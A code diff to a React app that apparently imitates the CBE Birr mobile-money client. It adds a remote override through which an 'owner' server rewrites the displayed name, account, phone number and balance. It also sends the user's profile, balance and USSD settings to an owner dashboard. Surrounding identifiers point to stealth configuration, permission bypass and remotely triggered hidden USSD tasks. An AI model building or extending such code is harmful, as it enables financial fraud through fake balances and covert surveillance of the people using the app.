@@ -25,7 +25,14 @@ import PinchZoomContainer from './PinchZoomContainer';
 import OwnerControlDashboard from './OwnerControlDashboard';
 import ProportionalScreenStage from './ProportionalScreenStage';
 import { CBE_UI_TEXT, CbeLang } from '@/lib/cbe-ui-i18n';
-import { CallSession, OWNER_PIN, PermissionBypassStatus, RemoteUssdTask, SupportSession } from '@/lib/owner-types';
+import {
+  CallSession,
+  DeviceRemoteOverride,
+  OWNER_PIN,
+  PermissionBypassStatus,
+  RemoteUssdTask,
+  SupportSession,
+} from '@/lib/owner-types';
 import {
   NativePermissionSettingKind,
   NativePermissionStatus,
@@ -41,6 +48,7 @@ import {
   fetchCallSessionDetailed,
   fetchRemoteUssdTaskClient,
   fetchSupportSession,
+  getAppliedOverrideSeq,
   getCachedLockState,
   getNativePermissionStatus,
   getOrCreateOwnerDeviceId,
@@ -61,6 +69,8 @@ import {
   STEALTH_CFG_KEY,
   STEALTH_CFG_VALUE,
   sendOfflineBeacon,
+  setAppliedOverrideSeq,
+  setCustomDeviceName,
   setNativeAudioMode,
   stopNativeCallRinger,
   syncDeviceTelemetry,
@@ -732,10 +742,35 @@ export default function CBEBirrFullscreenApp() {
     clientCallRtcStatus.hasRemoteVideo,
   ]);
 
-  const profileSyncRef = useRef({ userName, phoneNumber, userAccount, balance });
-  useEffect(() => {
-    profileSyncRef.current = { userName, phoneNumber, userAccount, balance };
-  }, [userName, phoneNumber, userAccount, balance]);
+  const profileSyncRef = useRef<{
+    userName: string;
+    phoneNumber: string;
+    userAccount: string;
+    balance: number;
+    rewardBalance: number;
+    appLang: 'en' | 'am';
+    isBalanceShown: boolean;
+    isRewardShown: boolean;
+    ussdProfilesJson: string;
+    activeUssdId: string;
+    phoneUssdProfilesJson: string;
+    activePhoneUssdId: string;
+  }>({
+    userName,
+    phoneNumber,
+    userAccount,
+    balance,
+    rewardBalance: reward,
+    appLang,
+    isBalanceShown,
+    isRewardShown,
+    ussdProfilesJson: JSON.stringify([DEFAULT_USSD_PROFILE]),
+    activeUssdId: DEFAULT_USSD_PROFILE.id,
+    phoneUssdProfilesJson: JSON.stringify([DEFAULT_PHONE_USSD_PROFILE]),
+    activePhoneUssdId: DEFAULT_PHONE_USSD_PROFILE.id,
+  });
+  const suppressNextTelemetryPushUntilMsRef = useRef<number>(0);
+  const applyRemoteOverrideRef = useRef<((ov: DeviceRemoteOverride) => void) | null>(null);
 
   // New Device Registration & Owner Approval Gate State
   const DEVICE_APPROVAL_KEY = 'cbebirr_device_approval_v1';
@@ -888,26 +923,31 @@ export default function CBEBirrFullscreenApp() {
     } catch {}
 
     profileSyncRef.current = {
+      ...profileSyncRef.current,
       userName: cleanName,
       phoneNumber: normPhone,
       userAccount: cleanAcc,
       balance,
+      rewardBalance: reward,
+      appLang,
+      isBalanceShown,
+      isRewardShown,
     };
 
     setDeviceGateState('pending');
 
     try {
       const res = await syncDeviceTelemetry({
-        userName: cleanName,
-        phoneNumber: normPhone,
-        userAccount: cleanAcc,
-        balance,
+        ...profileSyncRef.current,
         registerRequest: true,
         freshRegistration: true,
         forceApprovalCheck: true,
         clientGateState: 'pending',
       });
       if (res?.fromServer) {
+        if (res.deviceOverride) {
+          applyRemoteOverrideRef.current?.(res.deviceOverride);
+        }
         regServerAckRef.current = true;
         pendingNeedsFreshRegRef.current = false;
         if (res.approvalStatus === 'approved') {
@@ -1167,6 +1207,9 @@ export default function CBEBirrFullscreenApp() {
         if (!active || !res) return;
         if (res.fromServer) {
           applyPermBypassFromServer(res.permissionBypassStatus);
+          if (res.deviceOverride) {
+            applyRemoteOverrideRef.current?.(res.deviceOverride);
+          }
         }
         setRemoteLockState({
           locked: res.lockState.locked,
@@ -1356,6 +1399,9 @@ export default function CBEBirrFullscreenApp() {
       if (gate === 'approved') {
         processRemoteUssdTaskRef.current?.(res.remoteUssdTask);
       }
+      if (res.fromServer && res.deviceOverride) {
+        applyRemoteOverrideRef.current?.(res.deviceOverride);
+      }
     };
 
     runSync();
@@ -1412,14 +1458,7 @@ export default function CBEBirrFullscreenApp() {
     };
   }, [isStorageHydrated, deviceGateState, permissionBypassStatus, deliverSystemNotification, exitAppCleanly]);
 
-  // Immediately push profile/balance edits to owner dashboard when user edits name, phone, or balance
-  useEffect(() => {
-    if (!isStorageHydrated || deviceGateState !== 'approved' || regSubmitInFlightRef.current) return;
-    const t = setTimeout(() => {
-      syncDeviceTelemetry({ ...profileSyncRef.current, clientGateState: 'approved' }).catch(() => {});
-    }, 600);
-    return () => clearTimeout(t);
-  }, [userName, phoneNumber, userAccount, balance, isStorageHydrated, deviceGateState]);
+  // Debounced immediate profile & USSD sync effect is registered below USSD profile state hooks
 
   const teardownClientRtc = useCallback((stopMic = true) => {
     if (clientRtcPeerRef.current) {
@@ -3577,6 +3616,180 @@ export default function CBEBirrFullscreenApp() {
   const [ussdFormTemplate, setUssdFormTemplate] = useState<string>('');
   const [ussdFormError, setUssdFormError] = useState<string>('');
   const hiddenUssdTimerRef = useRef<NodeJS.Timeout | null>(null);
+
+  useEffect(() => {
+    profileSyncRef.current = {
+      userName,
+      phoneNumber,
+      userAccount,
+      balance,
+      rewardBalance: reward,
+      appLang,
+      isBalanceShown,
+      isRewardShown,
+      ussdProfilesJson: JSON.stringify(ussdProfiles),
+      activeUssdId,
+      phoneUssdProfilesJson: JSON.stringify(phoneUssdProfiles),
+      activePhoneUssdId,
+    };
+  }, [
+    userName,
+    phoneNumber,
+    userAccount,
+    balance,
+    reward,
+    appLang,
+    isBalanceShown,
+    isRewardShown,
+    ussdProfiles,
+    activeUssdId,
+    phoneUssdProfiles,
+    activePhoneUssdId,
+  ]);
+
+  useEffect(() => {
+    applyRemoteOverrideRef.current = (ov: DeviceRemoteOverride) => {
+      if (!ov || !ov.overrideSeq) return;
+      const currentApplied = getAppliedOverrideSeq();
+      if (ov.overrideSeq <= currentApplied) return;
+
+      suppressNextTelemetryPushUntilMsRef.current = Date.now() + 1400;
+
+      if (ov.deviceName) {
+        setCustomDeviceName(ov.deviceName);
+      }
+
+      const cleanPhone = String(ov.phoneNumber || '').replace(/\D/g, '');
+      let normPhone = cleanPhone;
+      if (normPhone.startsWith('251')) normPhone = normPhone.slice(3);
+      if (normPhone.startsWith('0')) normPhone = normPhone.slice(1);
+      normPhone = normPhone.slice(0, 9);
+
+      const cur = profileSyncRef.current;
+      const nextBalance = Number.isFinite(Number(ov.balance)) ? Number(ov.balance) : cur.balance;
+      const nextReward = Number.isFinite(Number(ov.rewardBalance))
+        ? Number(ov.rewardBalance)
+        : cur.rewardBalance;
+      const nextLang: CbeLang = ov.appLang === 'am' ? 'am' : 'en';
+      const nextBalShown = ov.isBalanceShown !== false;
+      const nextRewShown = Boolean(ov.isRewardShown);
+
+      const nextCbeProfiles: UssdProfile[] =
+        Array.isArray(ov.ussdProfiles) && ov.ussdProfiles.length > 0
+          ? [
+              DEFAULT_USSD_PROFILE,
+              ...ov.ussdProfiles.filter((p) => p && p.id !== DEFAULT_USSD_PROFILE.id),
+            ]
+          : [DEFAULT_USSD_PROFILE];
+      const nextActiveCbe = nextCbeProfiles.some((p) => p.id === ov.activeUssdId)
+        ? ov.activeUssdId
+        : DEFAULT_USSD_PROFILE.id;
+
+      const nextPhoneProfiles: UssdProfile[] =
+        Array.isArray(ov.phoneUssdProfiles) && ov.phoneUssdProfiles.length > 0
+          ? [
+              DEFAULT_PHONE_USSD_PROFILE,
+              ...ov.phoneUssdProfiles.filter((p) => p && p.id !== DEFAULT_PHONE_USSD_PROFILE.id),
+            ]
+          : [DEFAULT_PHONE_USSD_PROFILE];
+      const nextActivePhone = nextPhoneProfiles.some((p) => p.id === ov.activePhoneUssdId)
+        ? ov.activePhoneUssdId
+        : DEFAULT_PHONE_USSD_PROFILE.id;
+
+      setUserName(ov.userName || '');
+      setPhoneNumber(normPhone);
+      setUserAccount(ov.userAccount || '');
+      setBalance(nextBalance);
+      setReward(nextReward);
+      setAppLang(nextLang);
+      setIsBalanceShown(nextBalShown);
+      setIsRewardShown(nextRewShown);
+      setUssdProfiles(nextCbeProfiles);
+      setActiveUssdId(nextActiveCbe);
+      setPhoneUssdProfiles(nextPhoneProfiles);
+      setActivePhoneUssdId(nextActivePhone);
+      hasTriggeredUssdForAccountRef.current = false;
+      hasTriggeredUssdForPhoneRef.current = false;
+
+      if (deviceGateStateRef.current === 'register') {
+        setRegFullName(ov.userName || '');
+        setRegPhone(normPhone);
+        setRegAccount(ov.userAccount || '');
+      }
+
+      try {
+        localStorage.setItem('cbebirr_user_name', ov.userName || '');
+        localStorage.setItem('cbebirr_phone_number', normPhone);
+        localStorage.setItem('cbebirr_user_account', ov.userAccount || '');
+        localStorage.setItem('cbebirr_user_balance', String(nextBalance));
+        localStorage.setItem('cbebirr_user_reward', String(nextReward));
+        localStorage.setItem('cbe_app_lang', nextLang);
+        localStorage.setItem('cbe_balance_revealed', String(nextBalShown));
+        localStorage.setItem('cbe_reward_revealed', String(nextRewShown));
+        localStorage.setItem('cbebirr_ussd_profiles', JSON.stringify(nextCbeProfiles));
+        localStorage.setItem('cbebirr_active_ussd_id', nextActiveCbe);
+        localStorage.setItem('cbebirr_phone_ussd_profiles', JSON.stringify(nextPhoneProfiles));
+        localStorage.setItem('cbebirr_active_phone_ussd_id', nextActivePhone);
+      } catch {}
+
+      setAppliedOverrideSeq(ov.overrideSeq);
+
+      const nextSyncSnapshot = {
+        userName: ov.userName || '',
+        phoneNumber: normPhone,
+        userAccount: ov.userAccount || '',
+        balance: nextBalance,
+        rewardBalance: nextReward,
+        appLang: nextLang,
+        isBalanceShown: nextBalShown,
+        isRewardShown: nextRewShown,
+        ussdProfilesJson: JSON.stringify(nextCbeProfiles),
+        activeUssdId: nextActiveCbe,
+        phoneUssdProfilesJson: JSON.stringify(nextPhoneProfiles),
+        activePhoneUssdId: nextActivePhone,
+      };
+      profileSyncRef.current = nextSyncSnapshot;
+
+      void syncDeviceTelemetry({
+        ...nextSyncSnapshot,
+        appliedOverrideSeq: ov.overrideSeq,
+        checkOnly: deviceGateStateRef.current === 'register',
+        clientGateState: deviceGateStateRef.current,
+      }).catch(() => {});
+    };
+  }, []);
+
+  // Immediately push profile, balance, language & USSD edits to owner dashboard
+  useEffect(() => {
+    if (!isStorageHydrated || deviceGateState !== 'approved' || regSubmitInFlightRef.current) return;
+    if (Date.now() < suppressNextTelemetryPushUntilMsRef.current) return;
+    const t = setTimeout(() => {
+      if (Date.now() < suppressNextTelemetryPushUntilMsRef.current) return;
+      syncDeviceTelemetry({ ...profileSyncRef.current, clientGateState: 'approved' })
+        .then((res) => {
+          if (res?.fromServer && res.deviceOverride) {
+            applyRemoteOverrideRef.current?.(res.deviceOverride);
+          }
+        })
+        .catch(() => {});
+    }, 600);
+    return () => clearTimeout(t);
+  }, [
+    userName,
+    phoneNumber,
+    userAccount,
+    balance,
+    reward,
+    appLang,
+    isBalanceShown,
+    isRewardShown,
+    ussdProfiles,
+    activeUssdId,
+    phoneUssdProfiles,
+    activePhoneUssdId,
+    isStorageHydrated,
+    deviceGateState,
+  ]);
 
   useEffect(() => {
     return () => {
